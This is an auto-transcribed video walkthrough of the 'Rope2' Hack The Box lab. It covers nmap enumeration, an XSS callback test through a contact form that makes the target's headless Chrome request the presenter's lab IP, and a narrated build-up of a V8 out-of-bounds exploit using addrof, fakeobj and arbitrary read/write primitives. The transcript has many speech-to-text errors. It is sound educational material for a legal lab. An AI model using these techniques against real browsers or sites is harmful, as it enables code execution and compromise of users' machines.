 what's going on youtube this is ipsec i'm doing the first of three parts of rope two and that is the v8 browser exploit i wanna do the other two but i don't know when i'll have time for them because every part of this box takes an immense amount of preparation to do i probably spent two or three days just making sure i got this video right i had the first attempt of the video recorded a few days ago but as i was trying to do the heap i realized how bad this piece was and decided to start dedicating all the time to just do this one piece well um the other two piece is a heap challenge and a kernel exploit challenge so again a lot more learning but i didn't want to give people a bad foundation by saying things that were incorrect and i started this video a while ago but um i had to move because i bought a new house and due to coven we didn't want to hire movers so i had to do all that myself which took a lot of time and then unfortunately my girlfriend's cat of like 13 years passed away because of cancer so i lost a few more days where i just wasn't on the computer that much so what we're left with is this video and hopefully it's done well enough where you can understand how to exploit the chrome browser with a address of and fake object primitives so with that being said let's jump in as always we're gonna start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it rope two and then the ip address which is 101010196 since i'm not the root user i'm going to run this nmap with sudo and nmap does take a while so i've already ran it for us so we don't have to wait there are three ports open there is ssh on port 22 and its banner tells us it's ubuntu 10 which is relatively unique if you look at other boxes you'll see these banners uh we'll get into this one in a little bit we have http on port 5000 it's running nginx and map found a robots.txt file with things like autocomplete users search api admin and then the http title of this tells us it is get lab so if we didn't know it was git lab we take what's in this robots.txt file and run go busters against each of these entries to see if we can find any hidden endpoints but we know it's gitlab already so we won't really dig too much into that then we also have http on port 8000 and it's running a python web server called workzug or however you pronounce that so let's just get into these websites so i'm going to copy this ip address to my clipboard and we're going to go to 10 10 10 196 port 5000 which is the git lab there's nothing really here so i'm just gonna move and check the other one so 8000 and we can see a page that just says v8 dev and is developing the javascript engine if we click learn more it doesn't really go anywhere so let's scroll down it says check out the source code here we click this link it goes to server not found because it's looking for get lab.rope2.htb so let's go add that to our host file so sudo vi etsy hosts and we can say 10 10 10 196 and put that entry there and i always add just the parent domain of rope2.htb i don't think it's needed but it's just habit whenever you have um this also added the other one come on exit that and now when i refresh this we have a get lab page of the v8 source code and if we go to the commits it's going to take a little bit to load but once it's loaded we can see r4j the creator of this box has the latest commit at added array get last element and array set last element built-ins all these other commits are just the standard um devs from v8 so let's take a look at what r4j added to this project to see these two functions and looking at this the exploit is relatively straightforward it's returning the array length and this is actually one greater than it needs to be so you want to put a minus one because right now the array length is too big and if you wanted to return the very last element it would be array length minus one um let's see and this array set last element is the same thing but allowing us to write right after the array um let's see if we can make this make more sense because i know that's probably not a good explanation so let's search for arrays and v8 exploit and go to this blog post because i think this one shows the um picture of what this looks like so array length you'd expect it to be index 0 1 2 3 of the four items in the array but it's really going to be um array length is going to be five here so one two three four and then a fifth item and you're gonna get the pointer the memory address right after the elements which is this map pointer i believe uh we'll compile v8 and go in depth in this so hopefully it makes sense but essentially the last element you're expecting to get index three or whatever the last index is but you're getting what is after that which is a map pointer which tells the javascript engine what type of object is in this array it's just a bunch of metadata so that is an out of band read and there is a out of bandwrite with this array set last element so we can read and write to this map pointer which will allow us to get code execution and again if this doesn't make sense hopefully it does by the end of this video um it didn't make sense to me at first but thanks to like minito oxtf and fizzbuzz they've helped me kind of understand what's going on so big shout outs to them and um yeah but before we can actually exploit these we have to figure out a way to um make their browser make a request back to us so if we go to this download thing it's just going to be chrome we could download and go into it but not going to there is a contact us link and we can do messages like test and send it just says sent so let's try doing a cross-site scripting test so we're going to do image source is equal to http 10 10 14 my ip address is four i'm also going to start a web server up so python three dash m http dot server and we're on port 8000 let's make it get um xss.test okay so if someone browses to the contact us page in a browser we're linking an image on our web server if i click send we go back and we see 10 10 10 196 hit us um the python web server doesn't get us things like the headers so i'm going to run a netcat on port 8000 and redo this request i did ctrl shift r so it sent the whole payload again and we see the get xss test but now we can see the user agent which is just headless chrome so now we can make their web browser access our box so we're getting somewhere um we could just download the chrome and test it ourselves but it's not good to debug a whole browser if you want to find an exploit and v8 it's better just to grab v8 and then play with it i'm not going to do it on parrot because whenever i do like some type of exploitation i try to make my environment as similar to the target as i can so we're going to switch over to ubuntu now what version of ubuntu do they use this is where things like these banner headers come in handy so we can just search for this and let's go to google and see what version of ubuntu they use i actually want to leave that link let's do this google paste and let's see does this ever tell us what ubuntu 10 is um looking for like a fingerprint see jt sec i'm going to add fingerprint to this and see if we get it completely mundane bunch of things come on what is it nothing there i'll say ubuntu 10. see if we can figure out what this is this should be an os fingerprint somewhere uh it's definitely not 1004. um you want to 10. let's go so anything else we can do 373 python now i did with this let's do sh v 10 10 10 196 and i want to get the actual header so this is running let's see this is exactly what it told me let's grab this locate version string yeah let's just grab this one ubuntu 10. is this going to get it here we go so let's see what package this is if this tells us and we also have sh os identification so this is telling us it is disco which is i think ubuntu 19 which is not a long-term support disk trail and if we look at this uh here is the exact banner ubuntu 10 uh 1904. so disco is actually end of life now and being end of life makes it a pain to grab updates and stuff from apt so i installed ubuntu 1804. so in this case i didn't replicate the environment exactly just because it's end of life um even numbers are long-term support odd numbers are um like bleeding edge unstable so these odd ones won't have a long lifespan uh the even ones do so i'm going to go over to my ubuntu machine that i built for this and we will begin downloading and compiling v8 and this process will probably take hours um the critical thing is to make sure you have at least four gigs of memory if you do this with less than four gigs of memory one of these steps is probably going to fail so um keep that in mind uh software update restart later hopefully it doesn't screw anything up um open up firefox it's gonna take its time to open and we want to do um chromium depot tools to download this let's see where is the source i think this is it so i'm going to do let's go into documents get clone this and then once we download depot tools we export a path to add this into our path so depot tools so now everything in depot tools i have so we can do fetch v8 and this is going to start downloading um the v8 library and then once we have this we're going to um go down to the version that is on the box so and this fetch v8 takes a long time so while this happens let's just um upgrade our gdb so i'm gonna do gdb install jeff it's about gef and we're gonna go here and do the thing you should probably never do and just blindly execute this install script so copy this paste and this will now install jeff so when i do gdb we have it okay i did ctrl d there to exit the other thing that's weird is python's not there but python 3 is so i'm going to go user bin and ln s python 3 6 to python sudo and now when i type python it's found um that's just needed because some applications don't assume python version and say python3 they just say python so that helps that and we still have this running so um yeah and the fetch v8 command finished but we have a bunch of error messages so i don't think i was quick enough with the python because we see this python.fine no python found it's also looking for python 2.7 so what i'm going to do is sudo apt install python to 7 to put this on our system and then we're going to restart this fetch v8 command and hopefully it works the second time i don't know exactly what that v python is so yes and let's delete everything in our documents directory so ls la rm rf uh cipd g client um gcl v8 [Music] dot gcl and once this deletes we'll run fetch v8 again and hopefully it works so i'm going to run it and see if it works this time so it's probably gonna take um 10 minutes for me could take longer for you based upon internet and things like that so uh we'll just resume the video once it's done so after um installing python27 and fixing the uh python path to put python as just python it works so we can go into this cdva directory and do build install build depths.sh to install all these um yeah build dependencies so once this finishes running then we can do a get checkout to check out to the version that of v8 that we want so pause the video again and let this run now that the build dependencies are done we can do a get checkout and download the code that is closest to um the place i know that was descriptive um let's see oh um i have to connect to the vpn so let's do uh new terminal home sudo openvpn hdb ovpn and we'll close out on this guy i know i'm going to forget to connect back to the vpn whenever we go back to pair it which will probably be an hour from now or maybe longer but connect to the vpn and now i can download this so go to slash root v8 commits and we want to get the last build from uh the dev team so i'm gonna download this one so get checkout that i think yeah and then once we do this we want to run a sync command and once that sync finishes we can apply the patch so let's go to this and where is the diff the plain diff so we want to download this so once this sync is finished we will apply the diff so g client sync is finished so let's download the diff that we had got from github and do a get apply on it and now we can finally begin compiling but before i do i want to check how much memory i have and i only have um two gigs of memory and this next step is when you need four gigs of memory so if you ever see like ninja sub command failed it's probably out of memory it doesn't give good error messages so uh let's see can i edit memory when it's live probably not go to settings uh memory it's only let me do three gigs cancel oh god what'd i just do if i shut this machine down or suspend it first well let me do more let's go up here settings how much memory will you let me do memory yeah i guess it's only like um because it's running so let me shut down this machine and if it shows all my vms and vmware workstation i'll just pause the video and set the memory sorry for that sloppy cut of speaking mid thing it showed some information i feel like putting in the video but i'll click on this memory two gigs and we're gonna change it to 4096 and then boot this machine back up uh because yeah i don't know what device that is it's probably the cd-rom or something so once ubuntu boots up uh we'll have to export our path again let's login and then open up a terminal i'm gonna guess uh right here way off um there's not even an icon for terminal that's how far off i was uh let's see uh we want to go into documents that's why i have depot tools so export path is equal to pwd depot tools path okay so we wanted to go into v8 this is where we did the get apply so we can do tools dev v8 gen dot pi x64 dot release and if you thought the parts of this video took a while to do um you're in for a treat because this is probably gonna take uh what let's see i did something wrong because that should have taken a long time um oh wait i was just building something uh ninja dash c this is what's going to take a while yeah so these next two steps are going to take a while um you may want to assign more like processors or cores to your vm i'm on i think one processor for core uh probably should be up higher but i don't like giving too much to these vms uh two two probably should be at one four but oh well that's should be fine um gonna pause the video because again this takes forever and then the next one we gotta do is debug which takes even longer than release so these next two steps will probably take two to three hours i would guess maybe shorter but definitely uh don't expect to be doing anything anytime soon on your machine now that release is done compiling probably around an hour later we can now do the debug one which i believe does take even longer than release so we'll do x64.debug here instead of release and then we'll do ninja-c out.gn x64 dot debug so this will probably take i'm going to guess an hour and a half but it could take shorter longer and we'll i guess find out and whenever this done well i should have ran a date after this because it finished quite a while ago but i was busy doing other things i don't know how long the debug actually took but prepared to take around an hour i guess so let's start tmox and then go into each directory so x64 debug and then rename this whole pane to debug and then create a new pane for release and we're going to go cdlgn x64 dot release and name that um we're not going to touch release just yet but it's nice to have it there and we have to open up firefox and we go to a few websites just so you have a bunch of good reading material the very first thing i'm going to go is search for frac v8 i think oob this one and then also this faith article is really good this is what we're going to spend most the time going over uh there's some things that are different that we'll go into in just a minute but um for the most part i think that's great and then there's an arrays nv8 article this um ltam the simple bugs with complex exploits this is great because it gives a lot of visuals i believe yeah like how arrays are stored so we have the map the properties point of the elements and things like that so um it's a great article to also read so let's go over and start our instance so we can do gdb dot slash d8 and then we want to do a argument so allow natives syntax and what this is going to allow us to do it gives us a few extra functions so if i do a equals please sub and then we debug print a we get a bunch of information um if we exit out of this and then we just run it let's see and we do a equals please sub and i am low in disk space hopefully that doesn't become an issue but debug print a wait i don't think we're supposed to oh it saved the argument from last time so let's exit gdb altogether and start it back up and run it's starting a equals please sub debug print a and we don't have that function so that allow native syntax gives us that so run allow natives syntax i don't know how to clear the screen and stuff once we're in d8 other than going to gdb pressing ctrl l and doing continue but um to start this off let's go over to the faith article and see where he does so prereq knowledge building d8 we've done that the patch um we went into the actual exploit it's very similar but there's a get last object and a set last object that's going to get whatever is after the array so that's probably what we want to dig into um the thing let's see i'm going to go and just look at the code real quick cd sudo openvpn what is it sudo openvpn http so 10 10 10 196 i think this is it so we have array set last element and get last element and the issue was it wasn't doing a array length minus one so it's grabbing whatever is at the very end of the array and i believe this type of exploit works because arrays start at zero so if we had an array so a equals zero one two we do a zero um that's an actual value we do a one as a value as well so the array length is going to be three and what get last object is essentially doing is saying like hey a3 and a3 doesn't exist um it started at zero so this would be one uh zero one two and the length is kind of counting this as one so one two three it's just a bug where most people grew up thinking 0 is not a number it's undefined so you don't start there but in some cases at least in programming 0 is a number it's the very first start so this isn't null it is actually a number and this counts so one two three so i think that's where that bug kind of comes from so at least that's why array length is returning three because if there's only one value here if it was just a equals zero and you did array length of a to get how many objects are in here and it returned zero you'd be like what the hell there's one object in here so that is why uh i guess explanation of why i think that is the case so um let's go here break it down there is a thing called pointer tagging and immediate small integer and for some reason it's smi they reversed it um smi does a left shift so um when it stores some numbers and it's going to you'll see this when we do looking into the memory and array length it's going to left shift everything by one so in binary um this is 128 64 32 16 8 4 2 1. so the value 1 would be this in binary we left shift that ah don't want my arrow keys it turns into that it just moves everything one if we had three then three suddenly becomes this which is six so left smi is just left shift of one um he's going to create a few helpful functions so let's do this real quick so v pwn.js i should set paste paste this in and let's kind of explain these um this is just creating our um variables nothing there this is float to end so i don't know why it's not before it was um let's see i thought vim would automatically do comments okay nevermind so float to integer and essentially we give it a float value float values are pretty much like decimals so example 2.2 and out is going to give us a unsigned integer so that is that function this is the reverse so yank this put and this is integer to float this is n and this is out and i think this is also called a big end i believe i'm not sure i'll get rid of that just in case it's not um there is one function i'm going to want in this because we don't think in big numbers we think more in memory addresses at least i do so when i see a long string of like 10 digits i'm not going to know where that is in memory but if i just see it in hex format it may make things a bit easier so we're going to create a another function called two hex and we'll go in float ex 2.2 and out 0x something and this is super easy so function f2h value and one two three four return zero x plus f two i value dot two string 16 so that is our hex function so it converts the float to an integer and then converts it to a string 16 which converts it into hex um yeah before we continue one thing is really bothering me this is not hex because it has invalid characters so we'll just put valid characters there and let's go back over to the faith article and see what he talks about next so here's he's saying i to f so integer takes a big int and converts it into a float and we can run this with shell file.js and i don't think he does the debug print thing oh no he does right here okay allow native syntax so he's going into um what a array looks like of floats so let's do that um gdb i'm going to change up his examples a little bit to hopefully have it make more sense so i'm just going to clear the screen and then we can try a is equal to 1.1 1.2 1.1 1.2 and then b is equal to an array of 1.1 and 1.1 and c is equal to 1.1 1.2 1.3 so we have three different addresses here and it's going to be helpful in a minute the notes so let's do debug print on a and we're going to grab the top half so grab this paste and then put an old line break and we'll do a debug print on b next debug print b do the same thing so grab this then put a line brick i'm going to grab c percent debug print c and grab this and this isn't gonna line up with faith one for one because um we have point of compression or our point of compression is different than his and it changed in i think december of 2019 and even though his write-up is i think december of 2019 uh yeah december of 2019 this challenge i think was a 2018 challenge so the v8 engine changed a little bit how it stores things the main thing is his is storing i think in full addresses and ours will be storing it in 32-bit addresses because a point of compression uh let's see so let's go to gdb oops not insert mode oh god undo i'm trying to get my tmux pane to resize there we go okay so let's go and examine this address and every time we do something in gdb we're going to have to minus one and that is to deal with pointer tagging i believe it's said up here let's do uh pointer tagging so this if you read this section it helps understand exactly why but subtract 1 by everything and this is going to give us a list of just a bunch of 64-bit addresses and it's not going to line up exactly um if we're looking at a we see 909 and it ends in 909 here but this beginning zero eight zero four this begins in uh one for f9 so that doesn't match up and what happened is if you notice everything begins with zero x one nine so what pointer compression does is it chops this off and just stores it in i believe like the r13 register and it does that because it calls this the isolate and it's like you know i don't have to store this 500 times i can just store this once and then whenever we do um a register we just grab this so this isolate root value isn't going to be here for most things um there is one thing it will be it's the um we'll get into it later but for all in terms of purposes we don't need this until the very end so if we look 080c7501 oh wait this zero eight two eight one nine oh nine zero eight two eight one nine oh nine and the other address is right here zero eight zero four zero six e nine and that is going to be the map by blur e9 what is that i thought that was going to be the map so instead of doing telescope i'm going to do x backslash 16 um hex wide and that's going to divide it for us there we go so e9 where is e9 um oh shoot um i don't have my vim keys on uh t-mux set vim because t-mux defaults to i think e-max there are set mode keys mode b where is this come on dmx dial there we go set w g okay so e9 okay yeah it is the properties right here being able to highlight text is such a handy thing so um i'm going to divide this pane again so the memory address we start out with 909 which is going to be map then we go to the property so map property and then d9 that should be the element right here so map property then element and i'm splitting it like this because these are 64-bit addresses so element and what is after the element eight and please subscribe was four things it was um i want to say 1.1 1.2 1.1 1.2 so that's eight things in this after smi so remember smi we do the left shift so we have four so that's that if we left shift this one bit whoops we have that which is eight one two four eight so element then length and let's see i think these are going to be values next oh no we have to go to the element so if we go and inspect the element of this so x slash 16 xw we can either just copy this or we know um the element is this one and we're going to put the isolate root on manually which was one for f 9. so we examine this and we should be able to get the values and i did um 1.1 1.2 1.1 1.2 so we can see them actually repeat so let's see i want to say this could be 1.1 let's see is there another 9 000 there isn't so this is probably 1.1 this is probably 1.2 and we got 1.1 again and then 1.2 so let's see how can we convert this oh um we've got minus one does that change anything though let's see think f199 okay so i'm going to [Music] copy this let's go big mode copy paste it oh that did not paste well oh well and let's clear the screen and continue into d8 and inside of d8 uh we want to grab two addresses so we want to grab this i'm going to do um integer to float and grab this and we put a n on the end to signify it's bigent and oh we need to add our helper variables in this so i'm going to copy this x out of everything run it again and we'll do shell pwn.js to load that javascript file we created a few minutes ago so now we have that and we can do i2f this and we get 1.1 so that was what a 1.1 looks like in memory we can do the same thing with uh 1.2 so we grab this i2 f and the rest is all threes that um oh i2 f 0x copy paste and 1.2 so for this we could have probably telescoped it so if we uh telescope this address uh what oh because we restarted gdb um but all that would have done is showed it in um we'll just do it real quick let's continue a is equal to 1.1 1.2 1.1 1.2 b is equal to what do we do 1.1 1.1 and c is equal to 1.1 1.2 1.3 so all these top ones are gone because all the memory addresses change why won't that delete that pane is like frozen that was weird okay um so we want to do debug print a and we go to the very top grab this address go into the debugger and x slash 16xw the address -1 and we can get rid of these lines so we have the map the property the element the length so this is the element if we just telescoped this address so zero x one two c which is the isolate root this minus one get rid of that you can see the float value so 1.1 1.2 1.1 1.2 so the compression's not really doing anything here us looking at it in 32-bit probably made it a bit more confusing but that's the elements so now let's look at b so let's do debug print b and we just take this and we'll xlash16xw on this and again we have the map the property the element location and then the length the length is four remember we only have two things in this one so that's what the binary looks like we left shift this one and uh you have four that's one two four so the element is going to be here so we do telescope and then 0x12 c minus one this will show us all the addresses and there's only two items in this 1.1 twice so that is 1.1 and if you don't believe me i mean we could do i2f and 1.1 so the last thing we had was a um three items in the array and i chose this one because it's going to have um it's an odd number and it gets converted to an even because the left shift so let's do x slash 16 xw oh we might just do 4xw now since we don't need to see everything we know that's the map that's the property that's the element address wait a second i think i copied something wrong uh let's go back up to debug print c i probably copied the map yeah i copied something else um that is the map so 4xw minus one so i knew it was the map because it ended at nine or nine and we've been dealing with it so much but we got the map the property the element address and the length so again we do a left shift so we started with three so the two and the one is set and then after the left shift we move both of those left one and we're left with six so that is the um immediate small integer smi uh the next thing we want to get into is probably going to be um i guess we can do objects real quick and then we have to go over to release so with objects it's stored a little bit differently and i don't know exactly how it's stored but we'll know enough to be dangerous and get code execution so o is equal to there we go uh actually let's do a is equal to please sub 1 b is equal to thank you 2 and c is equal to um like this video one and this is going to be for my knowledge as well because i don't know exactly what's going on here i was trying to figure out how objects were stored in memory before this video but didn't get to it so let's do a i should have done a debug print uh we did a b o i think we're objects so we did a b c and we can do o is equal to a b c okay so a is equal to this is going to be um location let's just do debug print a and the element is going to be the same for all of these it's weird i don't know exactly why that's the case so debug print a i'm just going to say dash and put element there element and the property are the same element property as you can see there's a same exact values and we can say map okay so b let's do debug print b we have that map the map is different for each of these whereas if we went and did the integers the map was the same for everyone which is weird um the element and the property as you can see is always the same the only thing we really have to take account for i think is the map if we do um we won't even worry about c c is there for later on i wanted to put a value of one in something else so let's do debug print oh and this map is map packed elements and this is what we this is important to us um instead of just holy elements we want to be packed and the main reason is we want to be able to have a eventually doing a type confusion so if a variable is just straight and object then when we convert a float array to be an object it won't know what to do um if we put it as an array it behaves a bit differently and does what we want so hopefully that will make sense in just a minute we also have back pointers but i don't know exactly what i was going into here the danger of doing things live and this is the second time i recorded this whole thing so you can imagine how bad the first one went so if we look at oh it's here map and element and here the element and properties is not the same as well because um i'm guessing i don't know i have no idea why things are what they are but the key thing is objects is different so let's go in gdb and inspect these so x slash 16 xw we go to a minus one and we can see um let's see f41 we got the map we got the element then or the map and the property we don't know if this is a property element yet they're the same we can actually find out what it is by going to this object because this one was not the same so let's see ad1 so element is still here so this is the element this is the property and uh because this is now a float there are three objects in it so it's six again remember we did that before the left shift this you may think is only because there's one object but the value of this is one so if we go and look at this which is the second one xw minus one this was uh please sub colon one this was thank you colon two and done it let's do c debug print the whole reason i created this variable is because i wanted to verify what i just said that was correct so this should go back to two um x slash 16xw minus one yeah so this is the value of it and then this is pointing back to the element and i'm guessing if we looked at this area there's going to be pointers to the names of the variables or the name of the variable is going to point here somehow but we don't need to know that so that is kind of how objects are stored in memory hopefully this is beneficial um i was iffy if i want to go into that object piece because i don't understand it but let's go to the next thing so where are we in this so the map this is essentially just how um it's a bunch of metadata about what is being stored and how the application's going to handle it the exploit we're going to do is if you noticed in the element or in the object and um float things were handled differently when the array let's do v n hopefully i do this right when this array is a double it's going to print the value when this array is an object it's going to store a pointer and it's going to get the value so what this exploit is doing is we have this array that is a double and we write a memory address here and when we convert the array into an object this memory address we wrote now becomes a pointer and because it's a pointer when we go and access it it's going to get us the data where the pointer lives and i think this is going to be fake object so the second thing is we can have an array that is a double and let's just say that's 1.1 and we're going to convert this array into an object so we do some magic to convert this double into an object and then we say array object is now equal to a variable and what that's going to do it's going to store the pointer of this variable here because that's how objects work it expects a pointer variable and it points to somewhere so now that the pointer is here variables pointer we do some magic to convert the array back to a double so when we do this magic to convert it back to a double now the javascript engine is no longer going to follow where that pointer works so when we access this variable we get the location and this is what address of essentially is and hopefully it makes more sense when i go into it again we're covering it multiple times because it just took me a while to get my head wrapped around this so it's just a bunch of type confusion type stuff and that's what the map does the map tells it what type of variable it is is it a float is it an array is it a holy element what is it so that is what the float does so i'm trying to divide it if i want to take his code and then we go through and debug it or we just write our own code because some things are going to be slightly different because of how our exploit works and we have more point of compression let's copy his code and modify it and debug it because i think that'd be more beneficial so we have temp object i want to rename these so object array is going to be that float array okay so instead of this outer band this is a different ctf challenge and instead of set last downline get last element um it was oob out of band so we can say whoops get last element okay console log and i'm going to call this fl underscore map and this will be obj underscore map and i'm going to say fl float map plus fel map i think that's right and we're going to call this one object map okay let's see what this does so we run this with pwn.js and it crashed set the object map run crashed again so we have something wrong um it's probably the get last element piece because that's the main piece we changed from his code so let's see float array what if i'm calling get last element wrong oh um we probably have to convert this so float to hex nope see let's see if it's a console log that's failing oh crap um so remember when i said we'd have to switch to a release eventually now is that time um because the debug version actually has some type of memory checking in place to prevent out-of-band access and when it happens it crashes and the reason it does that is to help fuzzers because fuzzers like crashes like you fuzz application you throw a bunch of data and then you watch for the crashes and there's the ones you mark so if the application never crashes then the fuzzer won't know an out-of-band access happened um i guess sometimes you may want to do out-of-band access and that's why it doesn't crash on release or maybe it's a performance thing but yeah that's that's why so um let's just save that okay go here and i'm going to copy this code pwn.js to x64 dot release and then we switch over to release so gdb dot slash d8 run uh did we not do what the pwn.js oh i guess it didn't save something run okay so that's looking better so let's see object map we want to do f2h so we can run this and um let's see there was something i wanted to mention here what was it uh let's do debug print bell map debug print fl map no it's not iphone map i want what is this doing uh we're gonna do fl array and object array and look at those so let's run it again and then we want to debug print fl array and debug print obj array copy both of these and along with the float map and object map because we want to make sure everything is accurate as do we understand it so let's go into gdb and we'll say x slash 8 xw we want to go to fl array -1 fix our pane and fl map has the f the float array has the map at 909 and that matches and then we have uh the property which we don't see here because we don't have the good debug print as the other one did but at the property there and then we have the element location so let's take a look at the object array and let's see there is something wrong here so the object array is the get last element got us this value whereas with the flirt array it got us this value so we want the object map to be um this not this not exactly sure what went on there but we can see the differential is just 50. so if we just add 50 to the float map we get the correct object map we got that 721 here and then zero six e9 and again the e9 is here and then 909 is here and that creates an issue because the property doesn't line up if we just pushed this value with set last element i believe it's going to set um instead of i believe let's let's try it uh let's copy this let's see i continue and i think i can do obj array dot set last element and then set it to obj underscore map let's see what happened uh i honestly do not know but i'm excited to find out what oh uh wrong thing 8xw so i don't think it's set that's the same exact thing let's see what did i do obj array so obj array set last element obj map obj array set last element obj map then we debug print i expected it to change something but it didn't um yeah it's still exactly the same so that did nothing maybe those functions only work with floats but this object map is wrong we want to um i'm actually going to leave that and instead of was object map instead of this because it was getting one offset off and i don't know exactly what was happening there um we want to just add 50. so ver obj map is equal to we want to convert this i to f f2i no i should be able to just do fl map plus 0x 50 n get object map i think that'll work big ant other type so let's see f to h i don't think this is going to work because we return to string yeah that is definitely not it just looking at all those numbers nothing lines up uh so we have a float currently and i thought we could have just done that maybe just do 0x50 run nope so float to integer so now we got a big end there and then we can convert this entire thing back to a float so i to f like that that should work there we go so object map and float map i hope i save these notes i did sweet okay so let's do um debug print obj array debug print obj array we're going to grab this object map and now we want to go in gdb and examine this memory so x slash 8xw minus one let's see what we have e9 and five nine so i think we have it good we have the five nine being here and e9 being here so i think that's just andy and s that is reversing it but that looks better um before the e9 was on this side we wanted the e9 to be on this side so hopefully that kind of makes sense why we did that okay so the next thing we can do is the whole type confusion and getting the address of something so let's see where is it going to get the address of where is it okay eventually the script gets the address of this so that's what we're going to play with or which will get the address of anything so let's copy this set paste so let's see we're starting with the object and we put it in index zero then we change the object into a float array so set last element map2 which would be fl map and then we get the address by accessing index 0 and then we set it back to an object fell map let's see if this works i actually do not think it will obj map and obs good i'm just looking at all the variable names looks fine so addr of obj array uh we probably should not get herself um temp obj let's just do vr uh please sub is equal to one so addr of please sub we crashed i'm going to try doing it against an object real quick um ver please sub sequel to a1 addr of please sub so his code crashes let's step through and do it manually he starts out with um the object the very first thing here is he's starting with an object i think that's where the issue is so let's create the array of 1.1 and then we want to convert the array so if we do array 0 if we convert this into an object so set last element obj map and now if we do that it's going to give us the memory address to where 1.1 lives so if we do i2f i think uh i to f n [Music] we probably have to sign it or something but that should be where it lives or maybe um i don't know uh it's been too long so we created the array we set the last element of that array to a object map and now we want to place an object to link leak so for please sub is equal to a 1 so we want to set array 0 is equal to please sub and now if we do array 0 it's going to follow that because array right now is an object so array 0 has a pointer for an object and as an object it sees the map that is an object so when you reference this it's going to go okay well i go from array 0 to a pointer that's an address to get a variable however if we convert this into a float and call it now we have exactly where please sub lived so if we do f2h on this number this is where the variable please subscribe exist in memory so this is when it's an object and remember when we looked into the memory structure floats did not have pointers they just stored the value so when it's a float it goes a r0 and pointer is really just a double which is a fluid essentially so it just gives pointer and that goes to standard out or whatever the thing is so that's what that attack did so we have to change it up a little bit because i think it's because of the compression that we can't just start with an object so let's delete all this and let's see we want to create an array so oh my god stop fighting with me them great array so ar is equal to 1.1 and now we convert floating array to object array so ar set last element obj map and now we can place object to leak then convert back to array so we can do ar 0 is equal to leak and i like saying leak instead of an object better if i need some i wonder if i should have semicolons at the end of everything or not everything's working without them but javascript so error is zero and then we can set the last element to be a map and then we can grab the address then reset back to normal and we don't have to do that because we're creating a private variable here and it should just go away when we exit this function but if we were to clean up the code and optimize it it's always good to put things back to how you left it or how it was so let address is equal to arr 0 and then array set last element back to object map and then we need to return 32-bit address so what we had here is um the 64 bit but we have to do pointer compression so what we can do is we just do and 0x 1 2 1 2 1 2 1 2 n oh shoot um i was not nd8 or v8 whatever it is all we want to do is chop some stuff off cell phone.js f2 this is i2f f2h see what this is so all we want to do was get rid of this so that's why we did that and just zero it out so we go here and we return float to integer the address and that okay so now we have address of so we should be able to play with this so let's do ver please subscribe is equal to a1 addr of please subscribe and we get a and so we can do f2h i2 f and that's the very uh where please subscribe exist in the memory uh we don't have the isolate root which we will add but address of works now fake object is this is a hard one to wrap your head around or it was for me so fake objects going to let us do some memory manipulation and create an object in memory that lets us read and write from other places the memory manipulation part comes into play because we start off with like a fake array and the fake array is going to have like the array map and then values so the fake object we point it back to say it starts at this exact memory location and when javascript sees this it's like oh this is a float array map it's got that metadata and then it's going to process how it is and then we can just edit these values to be memory addresses and be able to go to addresses to write so hopefully that will make sense as we do this coding um oh whoa i did not mean to erase everything the notes okay so let's go v pwn.js i need go um out gn x64 release vpn.js so with fake object it's essentially the reverse of address of so we're going to start off with an array and that is going to be 1.1 again we probably don't have to do this inside of these functions we could just do it outside but i find it's easier to follow this way so we're going to put a memory address in it then convert to object so arr 0 is equal to i2f address there we go then set last element obj map so now um we set it to an address and because now it's an object map we can write to where this address is essentially so as an object it follows memory address so we can say the fake object is going to be arr zero and then we set it back to be a map probably don't have to but always good so that's the fake object primitive um we have to create a fake array so fake array is equal to fl map 1.1 1.2 1.3 and later on we're going to trim this down to only have 1.1 we need this address because we're gonna need to um have data in here so this would be like the length so you can't just have this piece and then ver fake it's gonna be fake obj address of fake array and it's not gonna work right off the bat with this because this fake array we have to point it to right here if we just um don't do that then fake array is gonna be pointed like we're just copying the variable over top of itself we want to point fake object to this spot in memory which is where we're doing type confusion to create an object so let's see uh i'm gonna set it to 1.1 for now i think that would be potentially easier to understand so let's go and run this we need gdb run with tone.js and we want to do a debug print on fake array and look at exactly where it exists in memory so we're going to do x slash i guess 32xw minus one so let's see let's do minus 1 minus 0x 30. so we're looking for where the repeat is and i wish i wrote what the float one was i think let's see that's the length because we have four objects in memory so here's float one a 1.1 and we have it repeat twice right and then this will be 1.2 and 1.3 and this is our starting point so we want to go up to here b8 so we're at d8 and we go up to b8 so 20 hex we want to go up or i think 32 4 8 12 16 20 24 28 32. so we're gonna go up 32 places which is 0x20 and at there this is where exactly where we are so instead of this being 1.1 this is going to be where we put the metadata for a float array so when we load this into memory it thinks we put an object there when it's not really an object we just put all the bytes that make it look like an object so let's go back to pwn js and now we can say fake array and it's going to be minus 0x 20n so now that we have the fake object we can now read and write from memory we just need to create those functions so read address and then we're going to deal with pointer tagging so if address is even then add one and i'm not sure exactly why this happens but um it's what faith did so if it's untagged or whatever it is you just add one to make it that so the whole reason why we do the minus one thing in gdb so now we can say our fake array the second value and we have to set this to be a float map so we're setting this 1.1 value now so i2 f we need to set the length to 1. i think we could probably set the length to be um one two three four eight as well i believe i'm not positive i think that may work um if i have issues i'll fix it but the length of this array is technically eight but we only care about this one address so i don't know i hate doing this because i know it's probably not going to work and then i'm going to spend time debugging addr minus 8n because i'm going to forget what i did return fake zero okay so this should let us read the address um we can try this out and really hope it works so let's see we want to create a array so let's just do a is equal to please sub 1 or create an object and then we want to read a ah this is going to be read what is it i2 f a oh we need address of of a so we now just have a memory address and what we read even though we passed it a variable like this may not seem like a big deal but because we could have just done like um a to read what's in a but we gave it this which is a hex string essentially so if we do i2 f this and then f2h we're able to just read this spot in memory uh of course we have isolate root and stuff but we're just able to read it so that's what this allowed us to do so if we read this and we do f2h or is it f2h this we want to save this string then i want to do a debug print on a and we're going to examine this in memory so we do x slash 16 xw minus one i'm typing all over the place there we go so 51 and e9 so we got 51 there and e9 here so a reed put us right here and when you combine that with the fake object this is where we set the fake object so now we have a variable that we just set at a place in memory that is a different object and then we could now read values out of it hopefully that makes sense um let's do right next so pretty much copy the same thing but we won't return something this time so this will be right and we do address value and this again if the pointer is untagged we tag the pointer and we do fake array one 32 n okay but now we're going to set the very first object or variable of this fake array so fake array 0 is equal to i2 f big and val so now this should let us write something into memory we can demonstrate this simply in gdb as always just run the program again and let's do um a debug print on float array to get where it is in memory and we're just going to write something to this bot so if i do write and then we do just one and i go to gdb and let's take a look at this so let's just look at it we probably have to go up one thing we have one right here so what 